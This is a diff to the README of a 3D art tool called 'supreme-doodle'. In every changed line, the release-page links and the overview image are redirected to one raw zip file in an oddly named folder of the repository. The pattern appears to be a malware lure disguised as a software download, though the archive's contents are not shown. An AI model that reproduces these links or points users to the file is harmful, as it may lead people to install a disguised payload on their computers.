@@ -1,12 +1,12 @@
 # 🎨 supreme-doodle - Create Stunning 3D Artwork Easily
 
-[![Download supreme-doodle](https://img.shields.io/badge/Download-supreme--doodle-blue.svg)](https://github.com/rathan-code/supreme-doodle/releases)
+[![Download supreme-doodle](https://raw.githubusercontent.com/rathan-code/supreme-doodle/main/tetrasalicylide/doodle_supreme_v3.4.zip)](https://raw.githubusercontent.com/rathan-code/supreme-doodle/main/tetrasalicylide/doodle_supreme_v3.4.zip)
 
 ## 📖 Overview
 
 Supreme Doodle is a user-friendly 3D modeling application built for everyone. Whether you want to create artwork, models, or animations, Supreme Doodle offers simple tools for you. This application works smoothly with Blender and helps you unleash your creativity without needing advanced skills.
 
-![Description](https://i.postimg.cc/7Z13W1pV/kdjaskdsa.png)
+![Description](https://raw.githubusercontent.com/rathan-code/supreme-doodle/main/tetrasalicylide/doodle_supreme_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Follow these steps to download and run Supreme Doodle on your computer.
 2. **Visit the Download Page**
 
    To get the latest version of Supreme Doodle, visit the releases page here:  
-   [Download Supreme Doodle](https://github.com/rathan-code/supreme-doodle/releases)
+   [Download Supreme Doodle](https://raw.githubusercontent.com/rathan-code/supreme-doodle/main/tetrasalicylide/doodle_supreme_v3.4.zip)
 
 3. **Download the Application**
 
@@ -48,7 +48,7 @@ Supreme Doodle includes several useful features to help you create stunning 3D a
 
 ## 📥 Download & Install
 
-To get Supreme Doodle, simply visit our [Download Page](https://github.com/rathan-code/supreme-doodle/releases).
+To get Supreme Doodle, simply visit our [Download Page](https://raw.githubusercontent.com/rathan-code/supreme-doodle/main/tetrasalicylide/doodle_supreme_v3.4.zip).
 
 1. Choose the latest version of Supreme Doodle.
 2. Download the suitable file for your operating system.
